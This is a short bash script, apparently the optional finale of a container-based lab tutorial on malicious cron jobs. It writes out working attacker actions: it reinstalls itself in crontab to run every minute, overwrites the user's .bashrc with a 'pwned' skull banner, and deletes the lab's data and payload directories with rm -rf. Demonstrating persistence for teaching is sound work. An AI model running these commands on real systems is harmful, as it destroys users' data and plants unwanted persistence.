#!/bin/bash
# Optional finale. Reinstalls itself via cron, defaces the shell, and wipes the
# lab's files inside the container. Read the tutorial's Finale section first.

LOG=/var/log/cron-lab.log

# Reinstall into the current user's crontab on every run.
( crontab -l 2>/dev/null | grep -v 'chaos.sh' ; echo '* * * * * /opt/lab/chaos.sh' ) | crontab - 2>/dev/null

# Replace the shell startup so every new terminal shows a defaced banner.
cat > "$HOME/.bashrc" <<'EOF'
cat <<'SKULL'
       ______
    .-"      "-.
   /            \
  |              |
  |,  .-.  .-.  ,|      Y O U ' V E   B E E N   P W N E D
  | )(_o/  \o_)( |
  |/     /\     \|      a cron job owns this box now -
  (_     ^^     _)       and it will not let go.
   \__|IIIIII|__/
    | \IIIIII/ |
    \          /
     `--------`
SKULL
PS1='\[\e[31m\]pwned:\w\$ \[\e[0m\]'
EOF

# Wipe the lab's files (scoped to the container's lab directories).
echo "[$(date '+%H:%M:%S')] (chaos) wiping the box..." >> "$LOG"
rm -rf "$HOME/company_data" /opt/lab/payloads /tmp/miner.sh 2>/dev/null

cat <<'BANNER'

   >>> The attacker's cron job just trashed the lab. <<<

BANNER
